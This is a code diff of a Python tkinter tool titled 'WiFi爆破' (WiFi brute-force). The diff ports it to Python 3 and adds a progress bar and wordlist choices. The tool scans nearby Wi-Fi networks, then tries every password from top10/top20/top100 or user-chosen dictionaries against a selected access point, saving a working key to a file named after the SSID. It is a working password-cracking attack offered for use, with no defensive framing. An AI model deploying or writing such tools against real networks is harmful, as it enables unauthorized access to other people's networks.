@@ -6,33 +6,60 @@
 # @Site    : 
 # @File    : wifidog.py
 # @Software: PyCharm
+import ctypes
 from tkinter import *
-from ttk import Treeview
+from tkinter.ttk import Treeview
+from tkinter.ttk import Progressbar
 from pywifi import *
 import time
 import threading
 import tkinter.filedialog
+import tkinter.messagebox
 
 
-class Watchdog(Frame):
-    def __init__(self, master=None):
-        Frame.__init__(self, master)
+class Watchdog():
+    def __init__(self):
+        self.root = Tk()
+        self.root.title('WiFi爆破')
+        self.root.wm_attributes('-topmost', 1)
+        self.root.geometry('820x400')
+        self.root.maxsize(800, 350)
+        self.root.minsize(800, 350)
         self.list = []
-        self.pack()
+        self.MODES = [
+            ("top10", 'top10.txt', 0),
+            ("top20", 'top20.txt', 1),
+            ("top100", 'top100.txt', 2),
+        ]
+        self.filename = './top10.txt'
+        self.break_flag = False
+        self.ap_list = None
+        self.ap_mac = None
         self.createWidgets()
 
     def createWidgets(self):
 
-        self.info_var = StringVar()
-        self.dic_var=StringVar()
+        self.frm = Frame(self.root)
+
+        self.prograss = Progressbar(self.frm, mode="determinate", orient=HORIZONTAL)
+        self.prograss.grid(row=1, column=1)
+        self.prograss["maximum"] = 100
+        self.prograss_num = IntVar()
+        self.prograss["variable"] = self.prograss_num
+        self.prograss.pack(fill=X, padx=5, pady=5)
+
+        self.frm_L = Frame(self.frm)
+        self.frm_R = Frame(self.frm)
+        self.frm_R.pack(side=RIGHT, fill=X)
+        self.frm_L.pack(side=LEFT, fill=X)
         # 表格
-        self.tree = Treeview(self, columns=['a', 'b', 'c', 'd', 'e'], show='headings', height=10,selectmode='browse')
+        self.tree = Treeview(self.frm_L, columns=['a', 'b', 'c', 'd', 'e'], show='headings', height=20, selectmode=BROWSE)
         # 内容居中
-        self.tree.column("a", width=80, anchor="center")
+        self.tree.column("a", width=50, anchor="center")
         self.tree.column("b", width=200, anchor="center")
-        self.tree.column("c", width=200, anchor="center")
-        self.tree.column("d", width=100, anchor="center")
-        self.tree.column("e", width=200, anchor="center")
+        self.tree.column("c", width=150, anchor="center")
+        self.tree.column("d", width=80, anchor="center")
+        self.tree.column("e", width=100, anchor="center")
 
         # 内容标题
         self.tree.heading('a', text='NO.')
@@ -40,42 +67,47 @@ class Watchdog(Frame):
         self.tree.heading('c', text='BSSID')
         self.tree.heading('d', text='SIGNAL')
         self.tree.heading('e', text='ENC/AUTH')
-        self.tree.bind('<ButtonRelease-1>',self.selectItem)
-        self.tree.pack()
+        self.tree.bind('<ButtonRelease-1>', self.selectItem)
+        self.tree.pack(fill=X, padx=5, pady=10)
 
-        self.scan_button = Button(self, text='开始扫描', command=self.thread_a)
-        self.scan_button.pack()
+        self.scan_button = Button(self.frm_R, text='扫描WiFi', command=self.thread_a)
+        self.scan_button.pack(fill=X, padx=5, pady=10, ipadx=8, ipady=5)
 
-        self.stop_scan_button = Button(self, text='选择字典文件',command=self.dic_select)
-        self.stop_scan_button.pack()
+        self.radio_frm = Frame(self.frm_R)
+        self.radio_frm.pack(fill=X, padx=5, pady=5)
+        self.radio_val = StringVar()
+        self.radio_val.set('top10.txt')
+        for text, mode, col in self.MODES:
+            b = Radiobutton(self.radio_frm, text=text, command = self.change_file,
+                            variable=self.radio_val, value=mode)
+            b.grid(column=col, row=0)
 
-        self.dic_label = Label(self, textvariable=self.dic_var, bg='green')
-        self.dic_label.pack()
+        self.stop_scan_button = Button(self.frm_R, text='选择其它文件',command=self.dic_select)
+        self.stop_scan_button.pack(fill=X, padx=5, pady=10, ipadx=8, ipady=5)
 
-        self.attack_button = Button(self, text='破解攻击',command=self.attack_wifi)
-        self.attack_button.pack()
+        self.attack_button = Button(self.frm_R, text='破解攻击',command=self.attack_wifi)
+        self.attack_button.pack(fill=X, padx=5, pady=10, ipadx=8, ipady=5)
 
-        self.stop_button = Button(self, text='终止攻击', command=self.break_flag_control)
-        self.stop_button.pack()
+        self.stop_button = Button(self.frm_R, text='终止攻击', command=self.break_flag_control)
+        self.stop_button.pack(fill=X, padx=5, pady=10, ipadx=8, ipady=5)
 
-        self.info_label = Label(self, textvariable=self.info_var, bg='red')
-        self.info_label.pack()
+        self.frm.pack()
 
     def get_wifi_interface(self):
         # 获取网卡接口
         wifi = PyWiFi()
         if len(wifi.interfaces()) <= 0:
-            self.info_var.set( '没有找到wifi网卡')
+            tkinter.messagebox.showerror('提示', '没有找到wifi网卡')
             exit()
         if len(wifi.interfaces()) == 1:
-            self.info_var.set('搜索到网卡设备 %s' % (wifi.interfaces()[0].name()))
+            # self.message_box('搜索到网卡设备 %s' % (wifi.interfaces()[0].name()))
             return wifi.interfaces()[0]
         else:
-            print '%-4s   %s' % ('No', 'interface name')
+            print ('%-4s   %s' % ('No', 'interface name'))
             for i, w in enumerate(wifi.interfaces()):
-                print '%-4s   %s' % (i, w.name())
+                print ('%-4s   %s' % (i, w.name()))
             while True:
-                iface_no = raw_input('Please choose interface No:')
+                iface_no = input('Please choose interface No:')
                 no = int(iface_no)
                 if no >= 0 and no < len(wifi.interfaces()):
                     return wifi.interfaces()[no]
@@ -84,62 +116,80 @@ class Watchdog(Frame):
         #绑定函数
         item = self.tree.focus()
         self.ap_mac= self.tree.item(item)['values'][2]
-        print self.ap_mac
+        # print (self.ap_mac)
 
     def dic_select(self):
-        self.filename = tkinter.filedialog.askopenfilename()
-        if self.filename != '':
-            self.dic_var.set('选择文件%s'%self.filename)
-        else:
-            self.dic_var.set("您没有选择任何文件")
+        self.radio_val.set('1')
+        self.filename = ""
+        new_filename = tkinter.filedialog.askopenfilename(filetypes=[('TXT', 'txt')])
+        if new_filename != '':
+            self.filename = new_filename
 
     def attack_wifi(self,timeout=10):
+        if self.break_flag == True:
+            tkinter.messagebox.showinfo('提示', '正在攻击，请先终止攻击')
+            return
+        if self.ap_list == None:
+            tkinter.messagebox.showinfo('提示', '未扫描WiFi，无法操作')
+            return
+        if self.ap_mac == None:
+            tkinter.messagebox.showinfo('提示', '请选择要爆破的wifi')
+            return
+        if self.filename == "":
+            tkinter.messagebox.showinfo('提示', '请选择爆破用字典文件')
+            return
         # 读取txt
-        result_file = 'result.txt'
-        keys = ''
         key_index = 0
         time_former=time.time()
         time_now=time.time()-time_former
         code=-1
-        self.break_flag=True
-        if self.filename!='':
-            with open('top10.txt', 'r')as f:
-                keys = f.readlines()
-            target=None
-            for k,x in self.ap_list.items():
-                if x.bssid==self.ap_mac:
-                    target=x
-                    break
-            if target!=None:
-                while key_index<len(keys) and self.break_flag:
-                    key=keys[key_index]
-                    target.key=key.strip()
-                    self.dic_var.set('当前正在尝试密码%s'%key.strip())
-                    self.iface.disconnect()
-                    self.iface.connect(self.iface.add_network_profile(target))
-                    while 1:
-                        time.sleep(0.1)
-                        code=self.iface.status()
-                        time_now=time.time()-time_former
-                        if time_now>timeout:
-                            break
-                        if code == const.IFACE_DISCONNECTED:
-                            break
-                        elif code == const.IFACE_CONNECTED:
-                            f=open(x.ssid,'w+')
-                            f.write(key)
-                            f.close()
-                    if code == const.IFACE_DISCONNECTED and time_now < 1:
-                        time.sleep(10)
-                        continue
-                    key_index=key_index+1
-                if break_flag:
-                    self.info_var.set('密码爆破已经完成')
-                else:
-                    self.info_var.set('已经终止爆破')
+        with open(self.filename, 'r')as f:
+            keys = f.readlines()
+        target=None
+        for k,x in self.ap_list.items():
+            if x.bssid==self.ap_mac:
+                target=x
+                break
+        self.break_flag = True
+        if target!=None:
+            while key_index<len(keys) and self.break_flag:
+                key=keys[key_index]
+                self.prograss_num.set((key_index+1)*100/len(keys))
+                target.key=key.strip()
+                # self.dic_var.set('当前正在尝试密码%s'%key.strip())
+                self.iface.disconnect()
+                self.iface.connect(self.iface.add_network_profile(target))
+                while 1:
+                    self.root.update()
+                    time.sleep(0.1)
+                    code=self.iface.status()
+                    time_now=time.time()-time_former
+                    if time_now>timeout:
+                        break
+                    if code == const.IFACE_DISCONNECTED:
+                        break
+                    elif code == const.IFACE_CONNECTED:
+                        tkinter.messagebox.showinfo('提示', '密码爆破成功，密码为%s'% key)
+                        f=open(x.ssid,'w+')
+                        f.write(key)
+                        f.close()
+                        return
+                if code == const.IFACE_DISCONNECTED and time_now < 1:
+                    time.sleep(10)
+                    continue
+                key_index=key_index+1
+            if self.break_flag:
+                tkinter.messagebox.showinfo('提示', '密码爆破失败')
+            else:
+                tkinter.messagebox.showinfo('提示', '已经终止爆破')
         else:
-            self.dic_var.set('请先选择字典再进行后续操作')
+            tkinter.messagebox.showinfo('提示', '选择的wifi已丢失')
+        self.break_flag = False
 
+    def change_file(self):
+        rad_file = self.radio_val.get()
+        self.filename = './'+rad_file
+        print(self.filename)
     def scan_wifi(self):
         #清空列表
         items=self.tree.get_children()
@@ -148,6 +198,7 @@ class Watchdog(Frame):
 
         self.iface = self.get_wifi_interface()
         self.ap_list = {}
+        self.ap_mac = None
         # 还需要扫描次数，此处没有
         self.iface.scan()
         time.sleep(5)
@@ -193,8 +244,5 @@ class Watchdog(Frame):
 
 
 if __name__ == '__main__':
-    root = Tk()
-    root.wm_attributes('-topmost', 1)
-    root.geometry('800x400+30+30')
-    dog = Watchdog(master=root)
-    dog.mainloop()
+    dog = Watchdog()
+    mainloop()
